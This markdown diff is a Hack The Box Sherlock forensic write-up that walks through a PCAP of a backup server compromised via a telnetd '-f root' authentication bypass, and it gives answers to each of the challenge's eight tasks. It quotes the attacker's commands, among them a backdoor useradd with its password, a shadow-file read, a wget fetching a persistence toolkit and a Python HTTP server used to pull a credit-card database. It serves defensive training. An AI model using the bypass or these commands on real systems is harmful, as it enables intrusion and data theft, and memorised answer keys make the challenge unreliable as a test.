@@ -1,0 +1,503 @@
+# Telly - HTB Sherlock Writeup (DFIR / Network Forensics)
+
+## Challenge Description
+
+> You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to
+> SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup
+> server. A DLP solution flagged a possible data exfiltration attempt from this server. According to
+> the IT team, this server wasn't very busy and was sometimes used to store backups.
+
+**Difficulty:** Very Easy  
+**Category:** DFIR / Network Forensics  
+**Evidence File:** `monitoringservice_export_202610AM-11AM.pcapng` (6.9 MB, 23,273 packets)
+
+---
+
+## Initial Analysis Methodology
+
+Before diving into the challenge questions, the goal is to understand what happened using only the
+evidence. This section walks through a repeatable approach you can apply to any unknown PCAP - the
+same steps, in the same order, every time.
+
+We have one PCAP from the backup server. We don't know yet who accessed it, what they did, or how
+they got in. The methodology below will answer all three.
+
+---
+
+### Step 1 - Protocol Hierarchy: What kind of machine is this?
+
+The very first thing to do with any unknown PCAP is find out what protocols it contains. This tells
+you what kind of machine was captured and what kind of activity to expect - before you read a single
+packet.
+
+**Wireshark:** `Statistics > Protocol Hierarchy`
+
+| Protocol | Frames | What it tells you                         |
+| -------- | ------ | ----------------------------------------- |
+| TCP      | 22,960 | Nearly all traffic is TCP-based           |
+| Telnet   | 6,363  | A significant portion is Telnet - port 23 |
+| TLSv1.2  | 2,280  | Some encrypted HTTPS/TLS traffic          |
+| UDP      | 313    | Minor - DNS, mDNS, NTP, SSDP              |
+
+**The red flag is immediate:** Telnet is a plaintext, unauthenticated-by-default legacy protocol
+that should not appear on a backup server in a monitored environment. 6,363 Telnet frames out of
+~23,000 total packets is not background noise - it is the incident.
+
+**The takeaway after Step 1:** This is a backup server that had an active Telnet session. Everything
+else - the TLS traffic, DNS queries, SSDP - is routine background. The Telnet stream is where the
+investigation begins.
+
+---
+
+### Step 2 - Endpoints & Conversations: Who's talking, and how much?
+
+Now we know what protocols are present. Next question: _who is communicating_, and is the traffic
+pattern normal for a server described as "not very busy"?
+
+There are two related views in Wireshark that answer this differently:
+
+- **`Statistics > Endpoints > IPv4`** - One row per IP, total packets aggregated across all
+  connections. Best for quickly identifying dominant talkers.
+- **`Statistics > Conversations > TCP`** - One row per TCP stream. Best for understanding _how_
+  the traffic is structured.
+
+**Start with Endpoints for triage, then drill into Conversations for detail.**
+
+#### Endpoints view
+
+Open `Statistics > Endpoints > IPv4` and sort by the **Packets** column (descending):
+
+| Address         | Packets | Role                                     |
+| --------------- | ------- | ---------------------------------------- |
+| 192.168.72.131  | 17,734  | ??? (dominant talker - suspicious)       |
+| 192.168.72.136  | 9,153   | The backup server (this machine)         |
+| **91.99.25.54** | 2,672   | External IP - not a known service        |
+| 192.168.72.135  | 2,014   | Other internal host                      |
+| 142.250.202.x   | ~500    | Google infrastructure (background HTTPS) |
+
+Two things stand out immediately. First, `192.168.72.131` is the dominant talker - nearly all
+traffic in this capture involves this one IP. Second, `91.99.25.54` is an external IP generating
+2,672 packets with the backup server on an unusual port. We don't know yet what either of these
+are. The Conversations view will tell us.
+
+#### Conversations view
+
+Switch to `Statistics > Conversations > TCP` and sort by packets. Make sure the **Bytes** and
+**Duration** columns are visible. If they aren't, right-click the column header to add them. These
+two columns are often more informative than packet count alone: **Bytes** tells you how much data
+was actually exchanged (a high packet count with near-zero bytes is just keepalives or handshakes),
+and **Duration** tells you how long the connection stayed open (a fraction of a second is a probe
+or automated request; many minutes is a human sitting at a keyboard). Note that Wireshark displays
+duration in **seconds**, so divide by 60 to get minutes. `872s ÷ 60 = ~14.5 minutes`, for example.
+
+| Address A                  | Address B               | Packets   | Bytes      | Duration    |
+| -------------------------- | ----------------------- | --------- | ---------- | ----------- |
+| **192.168.72.131 : 34910** | **192.168.72.136 : 23** | **6,363** | **515 KB** | **14m 32s** |
+| 192.168.72.136 : 47564     | 91.99.25.54 : 59        | 2,672     | 158 KB     | 8m 18s      |
+| 142.250.202.78 : 443       | 192.168.72.135 : 52654  | 475       | 2.3 MB     | 0.9s        |
+
+Now the picture becomes clear. `192.168.72.131` is on the other end of the Telnet session - it is
+the machine that connected to port 23 on the backup server. The 515 KB exchanged over 14 and a
+half minutes is the fingerprint of an interactive session: a human typing commands and reading
+output, not a tool firing automated requests. The `91.99.25.54` conversation is on port 59, an
+unusual port, starting after the Telnet session is already underway. Its 8-minute duration with
+steady low-volume traffic is characteristic of a C2 heartbeat rather than a data transfer.
+
+**What this pattern means:** One machine opened a 14-minute interactive Telnet session to the
+backup server, and during that session the backup server began making outbound connections to an
+unknown external IP on a non-standard port. This sequence (interactive access followed by outbound
+callbacks) is a classic post-exploitation pattern.
+
+---
+
+### Step 3 - Follow the Telnet Stream: What did the attacker do?
+
+Right-click any packet with port 23 and select `Follow > TCP Stream`. Because Telnet transmits
+everything in plaintext - commands, output, credentials - the entire session is readable as text.
+
+**Filter to isolate Telnet traffic first:**
+
+```
+tcp.port == 23
+```
+
+Reading the stream from the beginning, the very first thing sent by `192.168.72.131` is not a
+username or a password. It's a block of setup data. When a Telnet client connects, before any
+login prompt appears, both sides exchange a series of configuration options: things like the
+terminal type, screen dimensions, and environment variables. This handshake is called option
+negotiation, and it happens automatically in the background before you ever see a shell.
+
+One of the variables the client sends during this handshake is `USER`, the username the client
+wants to log in as. In the stream, that value reads:
+
+```
+USER → -f root
+```
+
+That is not a username. `-f root` is a command-line argument. What's happening here is that the
+client is deliberately setting `USER` to a value that looks like a flag rather than a name. On
+vulnerable versions of `telnetd` (GNU InetUtils ≤ 2.7), the server takes whatever value `USER`
+contains and passes it directly to the system's login program as part of the command it runs,
+without checking whether it's a real username or something else entirely. The login program then
+receives `login -f root`, where `-f` means "skip authentication, this user has already been
+verified." The server grants root access with no password prompt.
+
+At this point you have enough to identify the vulnerability. You don't need to know the CVE number
+off the top of your head. Searching for the observed behavior is enough. A query like
+`telnetd USER "-f root" authentication bypass` or `GNU InetUtils telnetd argument injection` will
+surface CVE-2026-24061 immediately. This is a good general habit: when you observe an anomalous
+mechanism in a PCAP, describe it in plain terms and search for it. The CVE database and security
+blogs will connect the behavior to the identifier. This is **CVE-2026-24061**.
+
+The server's response confirms the bypass worked. There is no login prompt. No password challenge.
+Within milliseconds of the `USER=-f root` packet, the server sends back the Ubuntu MOTD:
+
+```
+Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)
+System information as of Tue Jan 27 10:39:28 UTC 2026
+```
+
+Immediately followed by a root shell prompt:
+
+```
+root@backup-secondary:~#
+```
+
+From this point the entire attacker session is visible verbatim in the stream - every command
+typed, every output line returned. Scrolling through reveals the full post-exploitation chain:
+account creation, shadow file reads, filesystem enumeration, downloading a persistence script from
+GitHub, a Python HTTP server being started from `/opt`, and finally the database file being
+requested and served.
+
+---
+
+### Step 4 - Identify the Exfiltration: What left the network?
+
+The Telnet stream shows the attacker starting a Python HTTP server:
+
+```
+Serving HTTP on 0.0.0.0 port 6932 (http://0.0.0.0:6932/) ...
+```
+
+The server's access log output, visible in the same stream, records every file request. To confirm
+the transfer independently, apply:
+
+```
+tcp.port == 6932
+```
+
+This shows the HTTP conversation between `192.168.72.131` and `192.168.72.136:6932`, confirming
+that a file was downloaded from the backup server by the attacker's machine.
+
+---
+
+### Step 5 - Identify the C2: What called back after the session?
+
+The `91.99.25.54:59` conversation began at `10:48:01` - about three minutes after the attacker
+ran `linper.sh`, the Linux persistence toolkit downloaded during the session. Apply:
+
+```
+ip.addr == 91.99.25.54
+```
+
+The callbacks run from `10:48:01` to `10:56:20`, continuing even after the Telnet session closes
+at `10:54:00`. This confirms the persistence implant is running independently of the attacker's
+interactive session - it has its own channel home.
+
+---
+
+### Methodology Summary
+
+Every time you open an unknown PCAP, follow this sequence:
+
+1. **Protocol Hierarchy** tells you _what kind of machine_ this is and what stands out
+2. **Endpoints** tell you _who's suspicious_ (disproportionate traffic volume, unknown external IPs)
+3. **Conversations** tell you _how_ the traffic is structured (ports, duration, timing)
+4. **Follow the dominant stream** tells you _what actually happened_ - in this case, Follow TCP
+   Stream on the Telnet session reveals the entire attack in plaintext
+5. **Build protocol-specific filters** to confirm each event independently (port 6932 for
+   exfiltration, `ip.addr == 91.99.25.54` for C2)
+6. **Cross-reference timestamps** to connect activity into a single timeline and establish sequence
+
+Each step narrows your focus. You go from "I have 23,000 packets" to a complete narrative of the
+attack - and in a Telnet investigation, the stream itself is the narrative.
+
+---
+
+## Attack Timeline
+
+| Time (UTC) | Event                                                                            | Source        |
+| ---------- | -------------------------------------------------------------------------------- | ------------- |
+| `10:39:24` | TCP connection established from `192.168.72.131:34910` to `192.168.72.136:23`    | PCAP          |
+| `10:39:28` | CVE-2026-24061 exploit payload sent: `USER=-f root` via NEW_ENVIRON negotiation  | Telnet stream |
+| `10:39:28` | Ubuntu MOTD returned, root shell granted with no login prompt                    | Telnet stream |
+| `10:42:56` | Backdoor account created: `cleanupsvc` with password `YouKnowWhoiam69`           | Telnet stream |
+| `10:43:04` | `/etc/shadow` read, password hashes harvested                                    | Telnet stream |
+| `10:43:19` | Filesystem enumeration across `/`, `/media`, `/dev`, `/opt`, `/tmp`              | Telnet stream |
+| `10:44:29` | `wget` issued to download `linper.sh` from GitHub                                | Telnet stream |
+| `10:44:32` | `linper.sh` downloaded successfully (33.45 KB)                                   | Telnet stream |
+| `10:45:15` | `bash linper.sh --enum-defenses` executed, attacker surveys security posture     | Telnet stream |
+| `10:48:01` | C2 callbacks begin, victim connects to `91.99.25.54:59`                          | PCAP          |
+| `10:49:27` | Python HTTP server started on victim at port 6932, serving from `/opt`           | Telnet stream |
+| `10:49:52` | Attacker browses HTTP server root, enumerates available files                    | Telnet stream |
+| `10:49:54` | **Database exfiltrated**: `GET /credit-cards-25-blackfriday.db` served, HTTP 200 | Telnet stream |
+| `10:54:00` | Telnet session closes                                                            | PCAP          |
+| `10:56:20` | C2 callbacks cease                                                               | PCAP          |
+
+---
+
+## Questions & Answers
+
+### Task 1: What CVE is associated with the vulnerability exploited in the Telnet protocol?
+
+**PCAP:** `monitoringservice_export_202610AM-11AM.pcapng`  
+**Filter:** `tcp.port == 23`
+
+Start by applying the Telnet filter and scrolling through the packet list. The early packets are
+mostly small (TCP handshake, option negotiation) but around packet 52 something stands out: a
+packet from the attacker that carries a `USER` environment variable set to the value `-f root`.
+That is not a valid username. A flag being passed where a username should be is immediately
+suspicious and worth investigating further.
+
+Follow the TCP stream (`Right-click > Follow > TCP Stream`) to read the full exchange in both
+directions. The server sends no login prompt and no password challenge, just the Ubuntu MOTD
+followed by a root shell. The attacker authenticated as root without providing any credentials.
+
+At this point you have a clear description of the mechanism: a specific environment variable
+(`USER`) being set to an argument value (`-f root`) that bypasses authentication in the Telnet
+daemon. You don't need to already know the CVE. Describe what you see and search for it. Good
+search queries here would be:
+
+- `telnetd USER -f root authentication bypass`
+- `GNU InetUtils telnetd argument injection 2026`
+- `telnetd environment variable login bypass CVE`
+
+Any of these lead directly to CVE-2026-24061, a critical flaw in GNU InetUtils `telnetd` ≤ 2.7
+disclosed in January 2026. This search-from-observation approach works for any unknown
+vulnerability you encounter in a PCAP: describe the mechanism, not the name.
+
+> **Answer:** `CVE-2026-24061`
+
+---
+
+### Task 2: When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?
+
+**PCAP:** `monitoringservice_export_202610AM-11AM.pcapng`  
+**Filter:** `tcp.port == 23 && tcp.len > 100`
+
+Still in the Telnet TCP stream, the packet immediately following the `USER=-f root` injection is the
+server's response. Rather than a login prompt or an authentication failure, the server sends the
+Ubuntu MOTD banner, confirming the bypass worked:
+
+```
+Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)
+System information as of Tue Jan 27 10:39:28 UTC 2026
+```
+
+The timestamp on this packet in Wireshark is `10:39:28`. The very next packet from the server
+delivers the root shell prompt `root@backup-secondary:~#`. No credential exchange occurred at any
+point.
+
+> **Answer:** `2026-01-27 10:39:28`
+
+---
+
+### Task 3: What is the hostname of the targeted server?
+
+**PCAP:** `monitoringservice_export_202610AM-11AM.pcapng`  
+**Filter:** `tcp.port == 23`
+
+The hostname appears in two places within the Telnet stream, neither of which requires additional
+filtering. First, in the kernel identification line sent during Telnet option negotiation:
+
+```
+Linux 6.8.0-90-generic (backup-secondary) (pts/1)
+```
+
+Second, in every shell prompt throughout the attacker's session:
+
+```
+root@backup-secondary:~#
+```
+
+It is also visible in DNS traffic. Applying `dns` shows an A record query for
+`backup-secondary.localdomain` during the session.
+
+> **Answer:** `backup-secondary`
+
+---
+
+### Task 4: The attacker created a backdoor account to maintain future access. What username and password were set for that account?
+
+**PCAP:** `monitoringservice_export_202610AM-11AM.pcapng`  
+**Filter:** `tcp.port == 23 && frame.time >= "2026-01-27 10:42:00"`
+
+Scrolling through the Telnet stream at `10:42:56`, the attacker pastes a compound command:
+
+```bash
+sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd
+```
+
+Both the username and the password are transmitted in cleartext through the Telnet session.
+Seconds later the attacker reads `/etc/shadow`; the output is also visible in the stream,
+confirming the new account entry for `cleanupsvc` was written successfully.
+
+> **Answer:** `cleanupsvc:YouKnowWhoiam69`
+
+---
+
+### Task 5: What was the full command the attacker used to download the persistence script?
+
+**PCAP:** `monitoringservice_export_202610AM-11AM.pcapng`  
+**Filter:** `tcp.port == 23 && frame.time >= "2026-01-27 10:44:00"`
+
+At `10:44:29` the following command appears in the Telnet stream:
+
+```bash
+wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
+```
+
+The wget download progress output is immediately visible in the stream, resolving
+`raw.githubusercontent.com` to `185.199.108.133` and completing at `10:44:32`:
+
+```
+2026-01-27 10:44:32 (2.69 MB/s) - 'linper.sh' saved [34249/34249]
+```
+
+`linper.sh` is a Linux persistence toolkit from the public `montysecurity/linper` repository on
+GitHub. After downloading, the attacker runs it with `--enum-defenses` to survey the environment
+before executing the full persistence installation.
+
+> **Answer:** `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`
+
+---
+
+### Task 6: The attacker installed remote access persistence using the persistence script. What is the C2 IP address?
+
+**PCAP:** `monitoringservice_export_202610AM-11AM.pcapng`  
+**Filter:** `ip.addr == 91.99.25.54`
+
+In `Statistics > Endpoints > IPv4`, the IP `91.99.25.54` stands out as an external address
+generating 2,672 packets with the victim server. Applying the filter above and switching to the
+Conversations view shows a cluster of TCP connections from `192.168.72.136` to `91.99.25.54:59`
+beginning at `10:48:01`, approximately three minutes after `linper.sh` was executed. The
+connections continue through `10:56:20`, well past the end of the Telnet session at `10:54:00`,
+confirming the implant is running autonomously.
+
+Port 59 is an unusual choice. It is officially assigned to a long-defunct protocol, making it
+a practical evasion choice for C2 traffic that might otherwise be filtered at port 80 or 443.
+
+> **Answer:** `91.99.25.54`
+
+---
+
+### Task 7: The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?
+
+**PCAP:** `monitoringservice_export_202610AM-11AM.pcapng`  
+**Filter:** `tcp.port == 6932`
+
+At `10:49:27` the Telnet stream shows the attacker starting a Python HTTP server from `/opt` on the
+victim machine:
+
+```
+Serving HTTP on 0.0.0.0 port 6932 (http://0.0.0.0:6932/) ...
+```
+
+The server's access log output echoes back through the Telnet session in real time. At `10:49:54`
+the following line appears:
+
+```
+192.168.72.131 - - [27/Jan/2026 10:49:54] "GET /credit-cards-25-blackfriday.db HTTP/1.1" 200 -
+```
+
+Applying `tcp.port == 6932` in Wireshark confirms the HTTP transfer independently of the Telnet
+stream; the GET request and the 200 response are both visible as separate TCP packets.
+
+> **Answer:** `2026-01-27 10:49:54`
+
+---
+
+### Task 8: Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.
+
+**PCAP:** `monitoringservice_export_202610AM-11AM.pcapng`  
+**Filter:** `tcp.port == 6932`
+
+The database file `credit-cards-25-blackfriday.db` was transferred over HTTP port 6932. Export it
+via `File > Export Objects > HTTP`, locate the response for the GET request to
+`/credit-cards-25-blackfriday.db`, and save it. The file is a SQLite database and can be opened
+with any SQLite browser or queried directly:
+
+```bash
+sqlite3 credit-cards-25-blackfriday.db
+sqlite> SELECT * FROM customers WHERE name LIKE '%Quinn Harris%';
+```
+
+> **Answer:** `5312269047781209`
+
+---
+
+## Key Wireshark Filters Reference
+
+| Purpose                                  | Display Filter                                          |
+| ---------------------------------------- | ------------------------------------------------------- |
+| Isolate all Telnet traffic               | `tcp.port == 23`                                        |
+| Find the exploit payload packet          | `tcp.port == 23 && tcp.len > 100`                       |
+| Jump to post-exploitation commands       | `tcp.port == 23 && frame.time >= "2026-01-27 10:42:00"` |
+| Show all C2 traffic                      | `ip.addr == 91.99.25.54`                                |
+| Show C2 callbacks on port 59             | `tcp.port == 59`                                        |
+| Find the HTTP exfiltration traffic       | `tcp.port == 6932`                                      |
+| Show DNS queries (hostname confirmation) | `dns`                                                   |
+| View all attacker traffic                | `ip.addr == 192.168.72.131`                             |
+| View all victim traffic                  | `ip.addr == 192.168.72.136`                             |
+
+---
+
+## Network Topology
+
+```
+Attacker (192.168.72.131) — Kali Linux
+    |
+    | Telnet port 23  (CVE-2026-24061 — cleartext, no authentication)
+    v
+Backup Server (192.168.72.136) — Ubuntu 24.04.3 LTS
+    hostname: backup-secondary
+    telnetd: GNU InetUtils ≤ 2.7 (vulnerable)
+    |
+    |--- TCP port 59 ---------> C2 Server (91.99.25.54)
+    |                           linper.sh persistence callbacks
+    |
+    |<-- HTTP port 6932 ------- Attacker pulls credit-cards-25-blackfriday.db
+```
+
+---
+
+## MITRE ATT&CK Mapping
+
+| Phase             | Technique ID | Technique Name                                | Evidence                                                             |
+| ----------------- | ------------ | --------------------------------------------- | -------------------------------------------------------------------- |
+| Initial Access    | T1190        | Exploit Public-Facing Application             | CVE-2026-24061 against exposed `telnetd` on `backup-secondary`       |
+| Execution         | T1059.004    | Command and Scripting Interpreter: Unix Shell | Interactive root shell obtained via Telnet post-exploitation         |
+| Persistence       | T1136.001    | Create Account: Local Account                 | `cleanupsvc` user created via `useradd`, password set via `chpasswd` |
+| Persistence       | T1505        | Server Software Component                     | `linper.sh` installed as persistence mechanism with C2 callback      |
+| Command & Control | T1095        | Non-Application Layer Protocol                | C2 callbacks to `91.99.25.54:59` over raw TCP                        |
+| Discovery         | T1083        | File and Directory Discovery                  | Attacker enumerated `/`, `/media`, `/dev`, `/opt`, `/tmp`            |
+| Credential Access | T1003.008    | OS Credential Dumping: /etc/shadow            | `/etc/shadow` read to harvest password hashes                        |
+| Collection        | T1005        | Data from Local System                        | `credit-cards-25-blackfriday.db` identified and staged in `/opt`     |
+| Exfiltration      | T1048.003    | Exfiltration Over Unencrypted Non-C2 Protocol | Database downloaded via Python HTTP server on port 6932              |
+
+---
+
+## Skills Learned
+
+- PCAP triage methodology: using Protocol Hierarchy and Conversations to identify the dominant
+  threat before reading any individual packets
+- Telnet stream forensics: using Follow TCP Stream to reconstruct a complete attacker session in
+  plaintext, including the exploit payload, commands, and server output
+- CVE-2026-24061: how a `USER=-f root` argument injection bypasses GNU InetUtils `telnetd`
+  authentication entirely
+- Identifying C2 infrastructure from anomalous external IPs in the Endpoints view
+- Reconstructing data exfiltration from HTTP access log entries echoed inside a Telnet stream
+- Exporting and querying a SQLite database recovered from a PCAP via Wireshark's Export Objects
+- MITRE ATT&CK mapping from network evidence alone, without any host-based artifacts
+- Why Telnet must never be exposed: credentials, commands, file contents, and exploit payloads are
+  all transmitted in cleartext and permanently recorded in any network capture
